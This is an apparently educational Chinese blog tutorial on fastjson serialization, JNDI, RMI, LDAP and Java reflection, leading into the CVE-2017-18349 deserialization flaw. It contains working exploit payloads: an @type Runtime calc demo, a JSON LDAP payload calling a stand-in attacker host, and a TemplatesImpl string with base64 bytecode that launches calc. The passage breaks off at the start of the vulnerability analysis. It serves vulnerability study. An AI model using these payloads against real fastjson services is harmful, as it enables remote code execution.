<p>我们注意到明明实例化的是<code>Person person = new Person(&quot;Alice&quot;, 18);</code>为什么属性顺序是反过来的，原因是在<code>fastjson</code>中，默认情况下，生成的<code>JSON</code>字符串的顺序是按照<strong>属性的字母顺序</strong>进行排序的，而不是按照属性在类中的声明顺序。如果我们希望按照属性在类中的声明顺序来生成<code>JSON</code>字符串，可以通过在类中使用<code>@JSONType</code>注解来设置属性的序列化顺序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 将一个 Java 对象序列化为 JSON 字符串</span><br><span class="line">        Person person = new Person(&quot;Alice&quot;, 18);</span><br><span class="line">        String jsonString = JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        // 将一个 JSON 字符串反序列化为 Java 对象</span><br><span class="line">        String jsonString2 = &quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;&quot;;</span><br><span class="line">        Person person2 = JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + &quot;, &quot; + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义一个简单的 Java 类</span><br><span class="line">    @JSONType (orders = &#123;&quot;name&quot;,&quot;age&quot;&#125;)</span><br><span class="line">    public static class Person &#123;</span><br><span class="line">        private String name;</span><br><span class="line">        private int age;</span><br><span class="line">        public Person(String name, int age) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String getName() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public int getAge() &#123;</span><br><span class="line">            return age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们通过<code>@JSONType(orders = &#123;&quot;name&quot;, &quot;age&quot;&#125;)</code>来指定属性的序列化顺序，这样就是<code>name</code>在前，<code>age</code>在后了</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240320231946636.png"></p>
<p>了解一些基本的注解后我们来看看<code>@type</code></p>
<blockquote>
<p><code>@type</code>是<code>fastjson</code>中的一个特殊注解，用于标识<code>JSON</code>字符串中的某个属性是一个<code>Java</code>对象的类型。具体来说，当<code>fastjson</code>从<code>JSON</code>字符串反序列化为<code>Java</code>对象时，如果<code>JSON</code>字符串中包含<code>@type</code>属性，<code>fastjson</code>会根据该属性的值来确定反序列化后的<code>Java</code>对象的类型。</p>
</blockquote>
<p>测试代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        String json=&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;;</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</span><br><span class="line">        Runtime runtime=(Runtime) JSON.parseObject(json, Object.class);</span><br><span class="line">        runtime.exec(&quot;calc.exe&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们详细分析下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br></pre></td></tr></table></figure>

<p>我们导入Java标准库中的IOException异常类，因为如果发生了I&#x2F;O错误（如本demo的弹calc），又或者无法执行命令或读取命令输出时，会抛出<code>IOException</code>。</p>
<p>我们先定义json其中<code>@type</code>属性的值为<code>java.lang.Runtime</code>，然后执行下面语句指定在JSON解析过程中，允许反序列化指定的类或包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</span><br></pre></td></tr></table></figure>

<p>接着使用<code>parseObject</code>方法，将JSON字符串解析为Java对象</p>
<p>（由于<code>fastjson</code>在<code>1.2.24</code>之后默认禁用<code>AutoType</code>，因此这里我们通过下面命令来开启，否则会报错<code>autoType is not support</code>。）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime runtime=(Runtime) JSON.parseObject(json, Object.class);</span><br></pre></td></tr></table></figure>

<p>然后成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240323224255702.png"></p>
<p>我们继续看下面demo，先创建Person.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    public Person()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    public String toString()&#123;</span><br><span class="line">        return &quot;Person&#123;&quot;+&quot;name=&quot;+name+&quot;, age=&quot;+age+&#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public Person(String name,int age)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getName()&#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setName(String name)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    public int getAge()&#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setAge(int age)&#123;</span><br><span class="line">        this.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再看向main.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Person user=new Person();</span><br><span class="line">        user.setName(&quot;rev1ve&quot;);</span><br><span class="line">        user.setAge(18);</span><br><span class="line">        String s1=JSON.toJSONString(user,SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240323231657962.png"></p>
<p>与前面代码对比，可以发现其实就是在调用<code>toJSONString</code>方法的时候，参数里面多了一个<code>SerializerFeature.WriteClassName</code>方法。传入<code>SerializerFeature.WriteClassName</code>可以使得<code>Fastjson</code>支持自省，开启自省后序列化成<code>JSON</code>的数据就会多一个<code>@type</code>，这个是代表对象类型的<code>JSON</code>文本。<code>FastJson</code>的漏洞就是他的这一个功能去产生的在对该<code>JSON</code>数据进行反序列化的时候，会去调用指定类中对于的<code>get/set/is</code>方法， 后面会详细分析</p>
<p>然后我们可以通过以下三种方式来反序列化<code>json</code>字符串了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 方法一（返回JSONObject对象）：</span><br><span class="line">Person user = new Person();</span><br><span class="line">user.setAge(18);</span><br><span class="line">user.setName(&quot;rev1ve&quot;);</span><br><span class="line">String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">JSONObject jsonObject = JSON.parse(s1);</span><br><span class="line">System.out.println(jsonObject);</span><br><span class="line"></span><br><span class="line">// 方法二：</span><br><span class="line">Person user = new Person();</span><br><span class="line">user.setAge(18);</span><br><span class="line">user.setName(&quot;rev1ve&quot;);</span><br><span class="line">String s = JSON.toJSONString(user);</span><br><span class="line">Person user1 = JSON.parseObject(s, Person.class);  //反序列化转化为目标类型Person类</span><br><span class="line">System.out.println(user1);</span><br><span class="line"></span><br><span class="line">// 方法三：</span><br><span class="line">Person user = new Person();</span><br><span class="line">user.setAge(18);</span><br><span class="line">user.setName(&quot;rev1ve&quot;);</span><br><span class="line">String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">Person user1 = JSON.parseObject(s1,Person.class);</span><br><span class="line">System.out.println(user1);</span><br></pre></td></tr></table></figure>

<p>执行结果均为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Person&#123;name=rev1ve, age=18&#125;</span><br></pre></td></tr></table></figure>



<h3 id="JNDI是什么"><a href="#JNDI是什么" class="headerlink" title="JNDI是什么"></a>JNDI是什么</h3><blockquote>
<p><code>JNDI</code>是<code>Java</code>平台的一种<code>API</code>，它提供了访问各种命名和目录服务的统一方式。<code>JNDI</code>通常用于在<code>JavaEE</code>应用程序中查找和访问资源，如<code>JDBC</code>数据源、<code>JMS</code>连接工厂和队列等。</p>
</blockquote>
<h3 id="RMI是什么"><a href="#RMI是什么" class="headerlink" title="RMI是什么"></a>RMI是什么</h3><blockquote>
<p><code>RMI</code>指的是远程方法调用（<code>Remote Method Invocation</code>），是<code>Java</code>平台提供的一种机制，可以实现在不同<code>Java</code>虚拟机之间进行方法调用。</p>
</blockquote>
<p>我们直接看下面使用了<code>RMI</code>的<code>demo</code>代码，包括一个服务器端和一个客户端。这个<code>demo</code>实现了一个简单的计算器程序，客户端通过<code>RMI</code>调用服务器端的方法进行加、减、乘、除四则运算。</p>
<p>Calculator.java(计算机接口)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface Calculator extends Remote &#123;</span><br><span class="line">    public int add(int a,int b) throws RemoteException;</span><br><span class="line">    public int subtract(int a,int b) throws RemoteException;</span><br><span class="line">    public int multiply(int a,int b) throws RemoteException;</span><br><span class="line">    public int divide(int a,int b) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>public interface Calculator extends Remote</code>表示此接口是远程接口，提供加减乘除的运算操作</p>
<p>Server.java(服务端)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;//作用是导出远程对象</span><br><span class="line"></span><br><span class="line">public class Server extends UnicastRemoteObject implements Calculator &#123;</span><br><span class="line">    public Server() throws RemoteException&#123;&#125;</span><br><span class="line">    public int add(int x, int y) throws RemoteException &#123;</span><br><span class="line">        return x + y;</span><br><span class="line">    &#125;</span><br><span class="line">    public int subtract(int a, int b) throws RemoteException &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    public int multiply(int a, int b) throws RemoteException &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    public int divide(int a, int b) throws RemoteException &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Server obj=new Server();</span><br><span class="line">            //在端口号1028上创建RMI注册表</span><br><span class="line">            LocateRegistry.createRegistry(1028);</span><br><span class="line">            //获取指定1028端口上的RMI注册表实例的代码</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1028);</span><br><span class="line">            //将远程对象Calculator绑定到RMI注册表的代码</span><br><span class="line">            registry.bind(&quot;Calculator&quot;, obj);</span><br><span class="line">            System.out.println(&quot;Server ready&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.err.println(&quot;Server exception: &quot; + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Client.java(客户端)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class Client &#123;</span><br><span class="line">    private Client()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //获取localhost指定1028端口上的RMI注册表实例的代码</span><br><span class="line">            Registry registry=LocateRegistry.getRegistry(&quot;localhost&quot;,1028);</span><br><span class="line">            //寻找registry的远程对象Calculator</span><br><span class="line">            Calculator calc=(Calculator) registry.lookup(&quot;Calculator&quot;);</span><br><span class="line">            //调用远程方法</span><br><span class="line">            int result=calc.add(5,7);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;Result:&quot;+result);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            System.err.println(&quot;Client exception: &quot; + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo执行过程如下</p>
<p>创建RMI注册表，然后将远程对象Calculator绑定，运行代码启动服务</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324220432233.png"></p>
<p>然后在客户端运行代码成功执行运算过程</p>
<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20240324220536033.png" alt="image-20240324220536033"></p>
<h3 id="LDAP是什么"><a href="#LDAP是什么" class="headerlink" title="LDAP是什么"></a>LDAP是什么</h3><blockquote>
<p><code>LDAP</code>是轻型目录访问协议的缩写，是一种用于访问和维护分层目录信息的协议。在<code>Java</code>安全中，<code>LDAP</code>通常用于集成应用程序与企业目录服务（例如<code>Microsoft Active Directory</code>或<code>OpenLDAP</code>）的认证和授权功能。</p>
</blockquote>
<p>我们通过公司-员工管理的例子来理解Fastjson系列漏洞中ldap的作用</p>
<p>假设有一个名为”<code>example.com</code>“的公司，需要存储和管理员工信息。他们使用<code>LDAP</code>作为员工信息的目录服务，每个员工都在<code>LDAP</code>中有一个唯一的标识符（<code>DN</code>），举个例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DN: uid=john,ou=People,dc=example,dc=com</span><br><span class="line">cn: John Doe</span><br><span class="line">sn: Doe</span><br><span class="line">givenName: John</span><br><span class="line">uid: john</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br><span class="line"></span><br><span class="line">DN: uid=alice,ou=People,dc=example,dc=com</span><br><span class="line">cn: Alice Smith</span><br><span class="line">sn: Smith</span><br><span class="line">givenName: Alice</span><br><span class="line">uid: alice</span><br><span class="line">userPassword: &#123;SHA&#125;W6ph5Mm5Pz8GgiULbPgzG37mj9g=</span><br></pre></td></tr></table></figure>

<p>上图两位员工的DN由四个RDN（与DN相对区分）组成，分别是<code>uid=john,ou=People,dc=example,dc=com</code></p>
<p>可以使用LDAP查询语句来检索员工信息，例如<code>(&amp;(objectClass=person)(uid=john))</code>。</p>
<blockquote>
<p>&amp;表示AND操作符，实现多个查询条件，这里表示查找所有<code>objectClass</code>为<code>person</code>，且<code>uid</code>为<code>john</code>的员工信息</p>
</blockquote>
<p>而在<code>Fastjson</code>漏洞中，攻击者可以通过构造特定的<code>LDAP</code>查询语句，来执行任意代码或获取敏感信息。</p>
<p>例如下面JSON字符串包含恶意构造<code>LDAP url</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;value&quot;:&quot;ldap://hackvps.com/exp&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>当<code>Fastjson</code>解析该<code>JSON</code>字符串时，会触发<code>LDAP</code>查询操作，查询<code>hackervps.com</code>上的<code>LDAP</code>服务，并执行名为“<code>exp</code>”的操作。这就是<code>Fastjson</code>漏洞的成因之一。</p>
<h3 id="java反射是什么"><a href="#java反射是什么" class="headerlink" title="java反射是什么"></a>java反射是什么</h3><p>我们通过下面demo来进行理解</p>
<p>如果我们不用反射的话，我们写的代码会是下面这样</p>
<p>Person.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public Person(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void sayHello() &#123;</span><br><span class="line">        System.out.println(&quot;Hello, my name is &quot; + name + &quot;, I&#x27;m &quot; + age + &quot; years old.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Person&#123;&quot; +</span><br><span class="line">                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">                &quot;, age=&quot; + age +</span><br><span class="line">                &#x27;&#125;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Person person=new Person(&quot;张三&quot;,20);</span><br><span class="line">        person.sayHello();</span><br><span class="line">        person.setAge(18);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324223414057.png"></p>
<p>可以看到，我们一开始设置人的名字为张三，年龄为<code>20</code>，然后我们通过<code>setAge</code>方法来修改<code>Person</code>的<code>Age</code>属性，把年龄改成<code>18</code>。<br> 但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到<code>Java</code>反射技术。我们可以修改上面的<code>Main.java</code>为如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取Person类的Class对象</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;org.example.Person&quot;);</span><br><span class="line"></span><br><span class="line">        // 先获取构造函数，然后创建Person对象</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class, int.class);</span><br><span class="line">        Object person = constructor.newInstance(&quot;张三&quot;, 20);</span><br><span class="line"></span><br><span class="line">        // 调用Person对象的sayHello方法</span><br><span class="line">        Method method = clazz.getMethod(&quot;sayHello&quot;);</span><br><span class="line">        method.invoke(person);</span><br><span class="line"></span><br><span class="line">        // 绕过私有字段的访问限制，修改Person对象的age属性</span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;age&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(person, 18);</span><br><span class="line"></span><br><span class="line">        // 输出修改后的Person对象信息</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="与漏洞的联系"><a href="#与漏洞的联系" class="headerlink" title="与漏洞的联系"></a>与漏洞的联系</h4><p>为什么要用到反射，而不是直接调用<code>java.lang.runtime</code>来执行命令？</p>
<p>比如下面弹计算器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(IOUtils.toString(Runtime.getRuntime().exec(&quot;calc.exe&quot;).getInputStream(), &quot;UTF-8&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要运行上述代码，需要在maven中引入如下依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-io&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.11.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>添加完记得点击右侧的maven重新加载</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324225014432.png"></p>
<p>这样就成功弹出计算器</p>
<p>可是既然这么做可以执行命令，为什么还要搞反射呢？</p>
<blockquote>
<p>原来Java安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取Java的安全权限。如果代码没有通过安全检测，就无法执行危险操作。而反射机制可以绕过Java安全机制的限制，从而执行危险操作。</p>
</blockquote>
<p>我们以环境java8为例，demo如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    	//加载java.lang.Runtime类</span><br><span class="line">        Class&lt;?&gt; runtimeClass=Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        //获取该类的exec方法并且接受String参数</span><br><span class="line">        Method execMethod=runtimeClass.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">        //通过反射调用方法，执行系统命令并返回一个Process对象</span><br><span class="line">        Process process=(Process) execMethod.invoke(Runtime.getRuntime(),&quot;calc.exe&quot;);</span><br><span class="line">        //下面两行将进程的标准输出流转换为更方便读取的字符流形式</span><br><span class="line">        InputStream in=process.getInputStream();</span><br><span class="line">        BufferedReader reader=new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String line;</span><br><span class="line">        //使用BufferedReader进行逐行读取</span><br><span class="line">        while((line=reader.readLine())!=null)&#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240324231104393.png"></p>
<h2 id="漏洞学习"><a href="#漏洞学习" class="headerlink" title="漏洞学习"></a>漏洞学习</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）"></a>fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）</h3><p>（学习TemplatesImpl链的相关知识）</p>
<p>我们导入<code>Fastjson1.2.23</code>并自动下载相关依赖</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326125553114.png"></p>
<p>然后写入如下代码至Main.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        String text = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEAEG9yZy9leGFtcGxlL1Rlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAADAAEAA0ADQAOAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAXAAgAGAAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==\n\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行代码成功弹出计算器</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326125730090.png"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>上面json字符串test的<code>_bytecodes</code>内容是下面内容编译成<code>.class</code>文件再base64加密后的结果</p>
